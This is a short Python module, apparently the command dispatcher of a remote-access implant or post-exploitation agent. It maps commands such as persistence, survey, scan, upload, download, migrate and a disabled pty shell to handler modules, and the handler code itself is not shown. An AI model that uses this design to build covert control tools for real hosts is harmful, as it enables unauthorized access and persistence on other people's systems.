#!/usr/bin/env python
# coding: utf-8

# my files
from extras import scan
from extras import survey
from extras import toolkit
from extras import common
from extras import persistence
from extras import transfer

#################################
##           Commands          ##
#################################

# no return value.
# these either handle the data transfer on their own
# or simply do something quitely and need not send anything
silent = {
    #'kill': common.nothing,
    #'shell': common.ptyShell,
    'download': transfer.download,
    'upload': transfer.upload,
    'python': common.python,
    'db': common.nothing
}

# commands that return a result
active = {
    'persistence': persistence.run,
    'scan': scan.scan,
    'survey': survey.run,
    'migrate': common.nothing,
    'netapi': common.nothing
}
